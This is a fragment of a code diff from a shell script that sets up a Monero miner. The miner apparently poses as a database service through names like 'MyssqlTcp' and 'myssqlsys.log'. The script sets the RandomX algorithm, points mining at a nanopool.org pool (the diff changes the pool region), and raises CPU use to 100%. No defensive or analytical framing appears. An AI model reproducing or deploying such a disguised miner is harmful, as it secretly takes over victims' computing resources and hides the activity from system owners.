@@ -123,7 +123,7 @@ chmod 777 MyssqlTcp
 chmod 777 config.json
 
 sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
-sed -i 's/"url": *"[^"]*",/"url": "xmr-us-west1.nanopool.org:'$PORT'",/' $HOME/myssqltcp/config.json
+sed -i 's/"url": *"[^"]*",/"url": "xmr-eu1.nanopool.org:'$PORT'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
